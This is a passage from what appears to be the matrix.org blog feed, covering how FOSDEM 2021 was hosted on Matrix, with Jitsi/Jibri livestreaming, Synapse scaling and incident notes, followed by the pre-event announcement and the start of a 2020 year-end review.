&lt;p&gt;On the right-hand side you can see a &amp;quot;scoreboard&amp;quot; - a simple widget which tracked which messages in the devroom had been most upvoted, to help select questions for the Q&amp;amp;A session.  On the left-hand side you can see a hybrid Jitsi&#x2F;livestream widget used to coordinate between the speaker &amp;amp; host.  By default, the widget showed the local livestream of the video call - if you clicked &#x27;join conference&#x27; you&#x27;d join the Jitsi itself.  This stopped view-only users from overloading the Jitsi once the room became public.&lt;&#x2F;p&gt;
&lt;p&gt;The widgets themselves were hosted by the bot (you can see them at https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;conference-bot&#x2F;tree&#x2F;main&#x2F;web).  Meanwhile the chat.fosdem.org webclient itself ended up being identical to mainline Element Web 1.7.19, other than FOSDEM branding and being configured to hook the &#x27;video call&#x27; button up to the hybrid Jitsi&#x2F;livestream widget rather than a plain Jitsi.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, for conferencing we hosted an off-the-shelf Jitsi cluster sized to ~100 concurrent conferences, and for the Jibri livestreaming we set up an elastic scalable cluster using AWS Auto Scaling Groups.  Jibri is essentially a Chromium which views the Jitsi webapp, running in a headless X server whose framebuffer and ALSA audio is hooked up to an ffmpeg process which livestreams to the appropriate destination - so we chose to run a separate VM for every concurrent livestream to keep them isolated from each other.  The Jibri ffmpegs compressed the livestream to RTMP and relayed it to our nginx, which in turn relayed it to FOSDEM&#x27;s livestreaming infrastructure for use in the official stream, as well as relaying it back to the local video preview in the Matrix livestream&#x2F;video widget.&lt;&#x2F;p&gt;
&lt;p&gt;Here&#x27;s a screengrab of the Jitsi&#x2F;Jibri Grafana dashboard during the first day of the conference, showing 46 concurrent conferences in action, with 25 spare jibris in the scaling group cluster ready for action if needed :)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_1dfb1ef630c0ac8f5b3fd81f52491964.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;There was also an explosion of changes to Element itself to try to make things go as smoothly as possible.  Probably the most important one was implementing Social Login - giving single-click registration for attendees who were happy to piggyback on existing identity providers (GitHub, GitLab, Google, Apple and Facebook) rather then signing up natively in Matrix:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_45b228cf122b2faedfca5e36b6d52576.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This was a real epic to get together (and is also an important part of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;07&#x2F;gitter-now-speaks-matrix&quot;&gt;achieving parity&lt;&#x2F;a&gt; between Gitter and Element) - and seems to have been surprisingly successful for FOSDEM.  Almost 50% of users who signed up on the FOSDEM server did so via social login!  We should also be turning it on for the matrix.org server this week.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, on the Matrix server side, we ran a cluster of synapse worker processes (1 federation inbound, reader and sender, 1 pusher, 1 initial sync worker, 10 synchrotrons, 1 event persister, 1 event creator, 4 general purpose client readers, 1 typing worker and 1 user directory) within Kubernetes on &lt;a href=&quot;https:&#x2F;&#x2F;ems.element.io&quot;&gt;EMS&lt;&#x2F;a&gt;.  These were hooked up for &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;11&#x2F;03&#x2F;how-we-fixed-synapses-scalability&#x2F;&quot;&gt;horizontal scalability&lt;&#x2F;a&gt; as follows:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_22b8ea14fff89c1bce93767b82ab1db5.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The sort of traffic we saw (from day 2) looked like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_42c22d9a51988d1bd28a17b814fd3859.png&quot; alt=&quot;&quot; &#x2F;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_d2bd3f14d1ac53e5177152d48b8808e0.png&quot; alt=&quot;&quot; &#x2F;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_08a75cf1588657a935d3801c3f346886.png&quot; alt=&quot;&quot; &#x2F;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_5b7b327bbc4f633263daeaa6bbf54743.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;how-did-it-go&quot;&gt;How did it go?&lt;&#x2F;h2&gt;
&lt;p&gt;Overall, people seem to have had a good time.  Some folks have &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;haerwu&#x2F;status&#x2F;1358731829512183813&quot;&gt;even&lt;&#x2F;a&gt; been &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;AxSaucedo&#x2F;status&#x2F;1358048849944797187&quot;&gt;kind&lt;&#x2F;a&gt; enough to call it the &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;cterboven&#x2F;status&#x2F;1358343020576440322&quot;&gt;best&lt;&#x2F;a&gt; online event they&#x27;ve been to :)  This probably reflects the fact that FOSDEM rocks no matter what - and that Matrix is an inherently social medium, built by and for open source communities (after all, the whole Matrix ecosystem is developed over Matrix!).  Also, Matrix being an open network means that folks could join from all over, so the social dynamics already present in Matrix spilled over into FOSDEM - and we even saw a bunch of people spin up their own servers to participate; literally sharing the hosting responsibility themselves.  Finally, having critical infrastructure rooms available such as &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#beerevent:fosdem.org&quot;&gt;#beerevent:fosdem.org&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#cafe:fosdem.org&quot;&gt;#cafe:fosdem.org&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#food-trucks:fosdem.org&quot;&gt;#food-trucks:fosdem.org&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;bortzmeyer&#x2F;status&#x2F;1358022989875466240&quot;&gt;probably&lt;&#x2F;a&gt; helped as well.&lt;&#x2F;p&gt;
&lt;p&gt;That said, we did have some production incidents which impacted the event.  The most serious one was on Saturday morning, where it transpired that some of the endpoints hosted on the main Synapse process were taking way more CPU than we&#x27;d anticipated - most importantly the &#x2F;groups endpoints which handle traffic relating to communities (the legacy way of defining groups of rooms in Matrix).  One of the last things we&#x27;d done to prepare for the conference on Friday night was to create a +fosdem:fosdem.org community which spanned all 1000 public rooms in the conference, as well as add the +staff:fosdem.org community to all of those rooms - and unfortunately we didn&#x27;t anticipate how popular these would be.  As a result we had to do some emergency rebalancing of endpoints, spinning up new workers and reconfiguring the loadbalancer to relieve load off the main process.&lt;&#x2F;p&gt;
&lt;p&gt;Ironically the Matrix server was largely working okay during this timeframe, given event-sending no longer passes through the main process - but the most serious impact was that the conference bot was unable to boot due to hitting a wide range of endpoints on startup as it syncs with the conference, some of which were timing out.  This in turn impacted widgets, which had been hosted by the bot for convenience, meaning that the Jitsi conferences for stands and talk Q&amp;amp;A were unavailable (even though the Jitsi&#x2F;Jibri cluster was fine).  This was solved by lunchtime on Saturday: we are really sorry for folks whose Q&amp;amp;As or conferences got caught in this.  On the plus side, we spotted that many affected rooms just added their own widgets for their own Jitsis or BBBs to continue with minimal distraction - effectively manually taking over from the bot.&lt;&#x2F;p&gt;
&lt;p&gt;The other main incident was briefly first thing on Sunday morning, where two Jibri livestreams ended up trying to broadcast video to the same RTMP URL (potentially due to a race when rapidly removing and re-adding the jitsi&#x2F;livestream widget for one of the stands).  This caused a cascading failure which briefly impacted all RTMP streams, but was solved within about 30 minutes.  We also had a more minor problem with the active speaker recognition malfunctioning in Jitsi on Sunday (apparently a risk when using SCTP rather than Websockets as a transport within Jitsi) - this was solved around lunchtime.  Again, we&#x27;re really sorry if you were impacted by this.  We&#x27;ve learned a lot from the experience, and if we end up doing this again we will make sure these failure modes don&#x27;t repeat!&lt;&#x2F;p&gt;
&lt;p&gt;Other things we&#x27;d change if we have the chance to do it again include:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Providing a to-the-second countdown via a widget in the talk room so the speaker &amp;amp; host can see precisely when they&#x27;re going &#x27;live&#x27; in the devroom (and when precisely they&#x27;re going to be cut in favour of the next talk)&lt;&#x2F;li&gt;
&lt;li&gt;Providing a scratch-pad of some kind in the talk room so the host &amp;amp; speaker can track which questions they want to answer, and which they&#x27;ve already answered&lt;&#x2F;li&gt;
&lt;li&gt;Keep the questions scoreboard and scratchpad visible to the speaker&#x2F;host after their Q&amp;amp;A has finished so they can keep answering the questions in the per-talk room, and advertise the per-talk room more effectively.&lt;&#x2F;li&gt;
&lt;li&gt;Use Spaces rather than Communities to group the rooms together and automatically provide a structured room directory! (&lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;TzUfS08lMek?t=1609&quot;&gt;Like this!&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Use threads (once they land!) to help structure conversations in the devroom (perhaps these could even replace the hallway rooms?)&lt;&#x2F;li&gt;
&lt;li&gt;Make the schedule widgets easier to find, and have more of them around the place&lt;&#x2F;li&gt;
&lt;li&gt;Make room directory easier to find.&lt;&#x2F;li&gt;
&lt;li&gt;Give the option of recording the video in the per-talk and stands for posterity&lt;&#x2F;li&gt;
&lt;li&gt;Provide more tools to stands to help organise demos etc.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, there you have it.  We hope that this shows that it&#x27;s possible to host successful large-scale conferences on Matrix using an &lt;a href=&quot;https:&#x2F;&#x2F;sfconservancy.org&#x2F;blog&#x2F;2021&#x2F;feb&#x2F;08&#x2F;just-say-no-to-zoom&#x2F;&quot;&gt;entirely open source stack&lt;&#x2F;a&gt;, and we hope that other events will be inspired to go online via Matrix!  We should give a big shout out to &lt;a href=&quot;https:&#x2F;&#x2F;hope.net&quot;&gt;HOPE&lt;&#x2F;a&gt;, who independently trailblazed running conferences on Matrix last year and &lt;a href=&quot;https:&#x2F;&#x2F;hackaday.com&#x2F;2020&#x2F;08&#x2F;11&#x2F;hope-2020-delivers-historic-marathon-of-hacking&#x2F;&quot;&gt;inspired us&lt;&#x2F;a&gt; to make FOSDEM work.&lt;&#x2F;p&gt;
&lt;p&gt;If you want to know more, we also did a talk about FOSDEM-on-Matrix in this month&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Wp2rSyqZsbs?t=4903&quot;&gt;Open Tech Will Save Us&lt;&#x2F;a&gt; meetup and the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=TzUfS08lMek&quot;&gt;Building Massive Virtual Communities on Matrix&lt;&#x2F;a&gt; talk at FOSDEM went into more detail too.  Our historical &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;01&#x2F;04&#x2F;taking-fosdem-online-via-matrix&quot;&gt;Taking FOSDEM online via Matrix&lt;&#x2F;a&gt; blog has been somewhat overtaken by events but gives further context still.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, huge thanks to FOSDEM for letting Matrix host the social side of the conference.  This was a big bet, starting from scratch with our &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;1301285515774373889&quot;&gt;offer to help&lt;&#x2F;a&gt; back in September, and we hope it paid off.  Also, thanks to all the folks at Element who bust a gut to pull it together - and to the FOSDEM organisers, who were a real pleasure to work with.&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s hope that FOSDEM 2022 will be back in person at ULB - but whatever happens, the infrastructure we built this year will be available if ever needed in future.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Taking FOSDEM online via Matrix</title>
        <published>2021-01-04T12:25:08+00:00</published>
        <updated>2021-01-04T12:25:08+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2021/01/04/taking-fosdem-online-via-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2021/01/04/taking-fosdem-online-via-matrix/</id>
        
        <content type="html">&lt;div style=&quot;text-align: center; padding-bottom: 1em&quot;&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&quot;&gt;
    &lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-01-04-fosdem.jpg&quot; alt=&quot;FOSDEM&quot; width=&quot;480&quot;&#x2F;&gt;
&lt;&#x2F;a&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;Imagine you could physically step into your favourite FOSS projects’ chatrooms, mailing lists or forums and talk in person to other community members, contributors or committers?  Imagine you could see project leads show off their latest work in front of a packed audience, and then chat and brainstorm with them afterwards (and maybe grab a beer)?  Imagine, as a developer, you could suddenly meet a random subset of your users, to hear and understand their joys and woes in person?&lt;&#x2F;p&gt;
&lt;p&gt;This is &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&quot;&gt;FOSDEM&lt;&#x2F;a&gt;, Europe’s largest Free and Open Source conference, where every year thousands of people (last year, ~8,500) take over the Solbosch campus of the Université Libre de Bruxelles in Belgium for a weekend and turn it into both a cathedral and bazaar for FOSS, with over 800+ talks organised over 50+ tracks, hundreds of exhibitor stands, and the whole campus generally exploding into a physical manifestation of the Internet.  The event is completely non-commercial and volunteer run, and is a truly unique and powerful (if slightly overwhelming!) experience to attend.  Ever since we began Matrix in 2014, FOSDEM has been &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;02&#x2F;03&#x2F;matrix-at-fosdem-2020&quot;&gt;the&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;02&#x2F;04&#x2F;matrix-at-fosdem-2019&quot;&gt;focal&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;02&#x2F;05&#x2F;3-d-video-calling-with-matrix-webrtc-and-webvr-at-fosdem-2018&quot;&gt;point&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2017&#x2F;02&#x2F;06&#x2F;fosdem-2017-report&quot;&gt;of&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2016&#x2F;02&#x2F;03&#x2F;fosdem-16-retrospective&quot;&gt;our&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2015&#x2F;02&#x2F;04&#x2F;back-from-fosdem&quot;&gt;year&lt;&#x2F;a&gt; as we’ve rushed to demonstrate our latest work and catch up with the wider community and sync with other projects.&lt;&#x2F;p&gt;
&lt;p&gt;This year, things are of course different.  Thankfully FOSDEM 2020 snuck in a few weeks before the COVID-19 pandemic went viral, but for FOSDEM 2021 on Feb 6&#x2F;7th the conference will inevitably happen online.  When this was announced &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;fosdem&#x2F;status&#x2F;1301167254705303554&quot;&gt;a few months back&lt;&#x2F;a&gt;, we reached out to FOSDEM to see if we could help: we’d just had a lot of fun helping &lt;a href=&quot;https:&#x2F;&#x2F;hackaday.com&#x2F;2020&#x2F;08&#x2F;11&#x2F;hope-2020-delivers-historic-marathon-of-hacking&#x2F;&quot;&gt;HOPE go online&lt;&#x2F;a&gt;, and meanwhile a lot of the work that’s gone into Matrix and Element in 2020 has been around large-scale community collaboration due to COVID - particularly thanks to all the development driven by Element’s &lt;a href=&quot;https:&#x2F;&#x2F;sifted.eu&#x2F;articles&#x2F;element-germany-deal&#x2F;&quot;&gt;German Education&lt;&#x2F;a&gt; work.  Meanwhile, we obviously love FOSDEM and want it to succeed as much as possible online - and we want to attempt to solve the impossible paradox of faithfully capturing the atmosphere and community of an event which is “online communities, but in person!”... but online.&lt;&#x2F;p&gt;
&lt;p&gt;And so, over the last few weeks we’ve been hard at work with the FOSDEM team to figure out how to make this happen, and we wanted to give an update on how things are shaping up (and to hopefully reassure folks that things are on track, and that devrooms don’t need to make their own plans!).&lt;&#x2F;p&gt;
&lt;p&gt;Firstly, FOSDEM will have its own dedicated Matrix server at fosdem.org (hosted by &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;matrix-services&quot;&gt;EMS&lt;&#x2F;a&gt; along with a tonne of Jitsi’s) acting as the social backbone for the event.  Matrix is particularly well suited for this, because:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We’re an &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&quot;&gt;open standard&lt;&#x2F;a&gt; comms protocol with an open network run under a &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;foundation&quot;&gt;non-profit foundation&lt;&#x2F;a&gt; with loads of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;projects&#x2F;try-matrix-now&#x2F;&quot;&gt;open source implementations&lt;&#x2F;a&gt; (including the reference ones): folks can jump on board and participate via their own servers, clients, bridges, bots etc.&lt;&#x2F;li&gt;
&lt;li&gt;We provide official bridges through to IRC and XMPP (and most other chat systems), giving as much openness and choice as possible - if folks want to participate via Freenode and XMPP they can!&lt;&#x2F;li&gt;
&lt;li&gt;We’re built with large virtual communities in mind (e.g. Mozilla, KDE, Matrix itself) - for instance, we’ve worked a lot on &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;moderation&quot;&gt;moderation&lt;&#x2F;a&gt; recently.&lt;&#x2F;li&gt;
&lt;li&gt;We’ve spent a lot of time improving &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Fk7YRiFIwZ4?t=251&quot;&gt;widgets&lt;&#x2F;a&gt; recently: these give the ability to embed arbitrary webapps into chatrooms - letting you add livestreams, video conferences, schedules, Q&amp;amp;A dashboards etc, augmenting a plain old chatroom into a much richer virtual experience that can hopefully capture the semantics and requirements of an event like FOSDEM. &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We’re currently in the middle of setting up the server with a dedicated &lt;a href=&quot;https:&#x2F;&#x2F;element.io&quot;&gt;Element&lt;&#x2F;a&gt; as the default client, but what we’re aiming for is:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Attendees can lurk as read-only guests in devrooms without needing to set up accounts (or they can of course use their existing Matrix&#x2F;IRC&#x2F;XMPP accounts)&lt;&#x2F;li&gt;
&lt;li&gt;Every devroom and track will have its own chatroom, where the audience can hang out and view the livestream of that particular devroom (using the normal FOSDEM video livestream system).  There’ll also be a ‘backstage’ room per track for coordination between the devroom organisers and the speakers.&lt;&#x2F;li&gt;
&lt;li&gt;The talks themselves will be prerecorded to minimise risk of disaster, but each talk will have a question &amp;amp; answer session at the end which will be a live Jitsi broadcast from the speaker and a host who will relay questions from the devroom.&lt;&#x2F;li&gt;
&lt;li&gt;Each talk will have a dedicated room too, where after the official talk slot the audience can pop in and chat to the speaker more informally if they’re available (by text and&#x2F;or by moderated jitsi).  During the talk, this room will act as the ‘stage’ for the speaker &amp;amp; host to watch the livestream and conduct the question &amp;amp; answer session.&lt;&#x2F;li&gt;
&lt;li&gt;Every stand will also have its own chatroom and optional jitsi+livestream, as will BOFs or other adhoc events, so folks can get involved both by chat and video, to get as close to the real event as possible (although it’s unlikely we’ll capture the unique atmospheric conditions of K building, which may or may not be a bug ;)&lt;&#x2F;li&gt;
&lt;li&gt;There’ll also be a set of official support, social etc rooms - and of course folks can always create their own!  Unfortunately folks will have to bring their own beer though :(&lt;&#x2F;li&gt;
&lt;li&gt;All of this will be orchestrated by a Matrix bot (which is rapidly taking shape over at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;conference-bot&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;conference-bot&lt;&#x2F;a&gt;), responsible for orchestrating the hundreds of required rooms, setting up the right widgets and permissions, setting up bridges to IRC &amp;amp; XMPP, and keeping everything in sync with the official live &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2021&#x2F;schedule&#x2F;xml&quot;&gt;FOSDEM schedule&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;N.B. This is aspirational, and is all still subject to change&lt;&#x2F;strong&gt;, but that said - so far it’s all coming together pretty well, and hopefully our next update will be opening up the rooms and the server so that folks can get comfortable in advance of the event.&lt;&#x2F;p&gt;
&lt;p&gt;Huge thanks go to the FOSDEM team for trusting us to sort out the social&#x2F;chat layer of FOSDEM 2021 - we will do everything we can to make it as successful and as inclusive as we possibly can! :)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;p-s-we-need-help&quot;&gt;P.S. We need help!&lt;&#x2F;h2&gt;
&lt;p&gt;FOSDEM is only a handful of weeks away, and we have our work cut out to bring this all together in time.  There are a few areas where we could really do with some help:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Folks on XMPP often complain that the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-bifrost&quot;&gt;Bifröst&lt;&#x2F;a&gt; Matrix&amp;lt;-&amp;gt;XMPP bridge &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-bifrost&#x2F;issues&#x2F;64&quot;&gt;doesn’t support MAMs&lt;&#x2F;a&gt; - meaning that if XMPP users lose connection, they lose scrollback.  We’re not going to have time to fix this ourselves in time, so this would be a great time for XMPP folks who grok xmpp.js to come get involved and help to ensure the best possible XMPP experience!  (Similarly on other bifrost shortcomings).&lt;&#x2F;li&gt;
&lt;li&gt;It’d be really nice to be able to render nice schedule widgets for each devroom, and embed the overall schedule in the support rooms etc.  The current HTML schedules at &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2021&#x2F;schedule&#x2F;day&#x2F;saturday&#x2F;&quot;&gt;https:&#x2F;&#x2F;fosdem.org&#x2F;2021&#x2F;schedule&#x2F;day&#x2F;saturday&#x2F;&lt;&#x2F;a&gt; and (say) &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2021&#x2F;schedule&#x2F;room&#x2F;vcollab&#x2F;&quot;&gt;https:&#x2F;&#x2F;fosdem.org&#x2F;2021&#x2F;schedule&#x2F;room&#x2F;vcollab&#x2F;&lt;&#x2F;a&gt; don’t exactly fit - if someone could write a thing which renders them at (say) 2:5 aspect ratio so they can fit nicely down the side of a chatroom then that could be awesome!&lt;&#x2F;li&gt;
&lt;li&gt;While we’ll bridge all the official rooms over to Freenode, it’d be even nicer if people could just hop straight into &lt;em&gt;any&lt;&#x2F;em&gt; room on the FOSDEM server (or beyond) via IRC - effectively exposing the whole thing as an IRC network for those who prefer IRC.  We have a project to do this: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ircd&quot;&gt;matrix-ircd&lt;&#x2F;a&gt;, but it almost certainly needs more love and polish before it could be used for something as big as this.  If you like Rust and know Matrix, please jump in and get involved! &lt;&#x2F;li&gt;
&lt;li&gt;If you just want to follow along or help out, then we’ve created a general room for discussion over at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#fosdem-matrix:fosdem.org&quot;&gt;#fosdem-matrix:fosdem.org&lt;&#x2F;a&gt;.  It’d be awesome to have as many useful bots &amp;amp; widgets as possible to help things along.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Matrix Holiday Special 2020</title>
        <published>2020-12-25T00:00:00+00:00</published>
        <updated>2020-12-25T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/12/25/the-matrix-holiday-special-2020/" type="text/html"/>
        <id>https://matrix.org/blog/2020/12/25/the-matrix-holiday-special-2020/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Over the years it’s become a tradition to write an end-of-year wrap-up on Christmas Eve, reviewing all the things the core Matrix team has been up over the year, and looking forwards to the next (e.g. here’s &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;12&#x2F;24&#x2F;the-2019-matrix-holiday-update&quot;&gt;last year’s edition&lt;&#x2F;a&gt;).  These days there’s so much going on in Matrix it’s impossible to cover it all (and besides, we now have &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;category&#x2F;this-week-in-matrix&quot;&gt;This Week In Matrix&lt;&#x2F;a&gt; and better blogging in general to cover events as they happen).  So here’s a quick overview of the highlights:&lt;&#x2F;p&gt;
&lt;p&gt;Looking back at our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;12&#x2F;24&#x2F;the-2019-matrix-holiday-update#2020&quot;&gt;plans for 2020&lt;&#x2F;a&gt; in last year’s wrap-up, amazingly it seems we pretty much achieved what we set out to do.  Going through the bulletpoints in order:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;05&#x2F;06&#x2F;cross-signing-and-end-to-end-encryption-by-default-is-here&quot;&gt;turned on End-to-end Encryption by default&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;We have a dedicated team making major improvements to First-Time User Experience in Element (as of the last few months; hopefully you’ve been noticing the improvements!)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;welcome-to-element&#x2F;&quot;&gt;RiotX became Element Android and shipped&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Communities have been completely reinvented as &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;_Ade0FZfnWo?t=39&quot;&gt;Spaces&lt;&#x2F;a&gt; (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;commits&#x2F;matthew&#x2F;msc1772&#x2F;proposals&#x2F;1772-groups-as-rooms.md&quot;&gt;MSC1772&lt;&#x2F;a&gt;) and while in alpha currently, they should ship in Jan.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;11&#x2F;03&#x2F;how-we-fixed-synapses-scalability&quot;&gt;Synapse scalability is fixed&lt;&#x2F;a&gt;: we now shard horizontally by event - and Synapse is now pretty much &lt;a href=&quot;https:&#x2F;&#x2F;patrick.cloke.us&#x2F;areweasyncyet&#x2F;&quot;&gt;entirely async&#x2F;await&lt;&#x2F;a&gt;!&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;08&#x2F;dendrite-is-entering-beta&#x2F;&quot;&gt;Dendrite Beta shipped&lt;&#x2F;a&gt;, as did the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;06&#x2F;02&#x2F;introducing-p-2-p-matrix&#x2F;&quot;&gt;initial P2P Matrix experiments&lt;&#x2F;a&gt;, which have subsequently continued to evolve significantly (although we haven’t implemented &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;rav&#x2F;proposal&#x2F;remove_mxids_from_events&#x2F;proposals&#x2F;1228-removing-mxids-from-events.md&quot;&gt;MSC1228&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;neilalexander&#x2F;identities&#x2F;proposals&#x2F;2787-portable-identities.md&quot;&gt;MSC2787&lt;&#x2F;a&gt; portable accounts yet). Check out the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;15&#x2F;dendrite-2020-progress-update&quot;&gt;Dendrite end-of-year update&lt;&#x2F;a&gt; for more.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;_Ade0FZfnWo?t=939&quot;&gt;MLS experiments are in full swing&lt;&#x2F;a&gt; - we got the first MLS messages passing over Matrix a few days ago, and Decentralised MLS work is back on the menu after an initial sprint in May.&lt;&#x2F;li&gt;
&lt;li&gt;There’s been a valiant mission to improve Bridge UX in the form of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2346&quot;&gt;MSC2346&lt;&#x2F;a&gt; and its implementations in Element Web, although this has ended up failing to get to the top of the todo list (sorry Half-Shot! :&#x2F;)&lt;&#x2F;li&gt;
